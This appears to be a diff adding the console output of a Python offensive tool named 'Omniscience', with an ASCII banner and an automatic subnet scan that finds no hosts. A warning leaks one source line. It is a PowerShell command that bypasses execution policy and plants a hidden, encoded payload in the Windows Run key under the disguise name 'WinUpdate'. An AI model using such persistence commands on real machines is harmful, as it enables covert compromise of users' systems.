@@ -1,0 +1,38 @@
+[*] [33mLoading High-Technology Modules...[0m
+/home/runner/workspace/6.py:553: SyntaxWarning: invalid escape sequence '\S'
+  return '''powershell -NoProfile -ExecutionPolicy Bypass -Command "$reg='HKCU:\Software\Microsoft\Windows\CurrentVersion\Run';Set-ItemProperty $reg 'WinUpdate' 'cmd /c start powershell -w hidden -e JABjAGwA...';Set-ItemProperty $reg 'WinUpdate' (Get-Content 'C:\Windows\System32\calc.exe' -Raw)"'''
+[0m[+] [32mOmniscience Framework Ready.[0m
+[0m[36m[1m================================================================================[0m
+[0m[36m[1m   ____  __  ___ _   _ ___  ____   ____ ___ _____ _   _  ____ _____ [0m
+[0m[36m[1m  / __ \|  \/  || \ | |_ _ / ___| / ___|_ _| ____| \ | |/ ___| ____|[0m
+[0m[36m[1m | |  | | |\/| ||  \| || | \___ \| |    | ||  _| |  \| | |   |  _|  [0m
+[0m[36m[1m | |__| | |  | || |\  || |  ___) | |___ | || |___| |\  | |___| |___ [0m
+[0m[36m[1m  \____/|_|  |_||_| \_|___|____/ \____|___|_____|_| \_|\____|_____|[0m
+[0m[37m[1m             Advanced Network Command Center | Version 5.1[0m
+[0m[36m[1m================================================================================
+[0m
+[0m[*] [35mAUTONOMOUS STARTUP INITIATED...[0m
+[0m[*] [36mType 'help' for 140+ commands.[0m
+[0m[*] Running initial network scan...[0m
+[0m
+======================================================================[0m
+[0m  OMNISCIENCE - AUTOMATIC NETWORK DISCOVERY[0m
+[0m======================================================================[0m
+[0m
+[*] Step 1: Detecting network configuration...[0m
+[0m    Local IP     : 172.31.89.194[0m
+[0m    Network     : 172.31.89.0/24[0m
+[0m    Gateway     : 172.31.89.1[0m
+[0m    Subnet Mask  : 255.255.255.0[0m
+[0m
+[*] Step 2: Running comprehensive scan on 172.31.89.0/24...[0m
+[0m
+[*] Step 3: Identifying special devices...[0m
+[0m
+[*] Step 4: Determining device types...[0m
+[0m
+[*] Step 5: Advanced device fingerprinting...[0m
+[0m
+[*] Discovery complete! Found 0 devices.[0m
+[0m[31m[!] No hosts discovered. Run 'auto' first.[0m
+[0m[0m[36momni[37m@[31mshell[37m> 
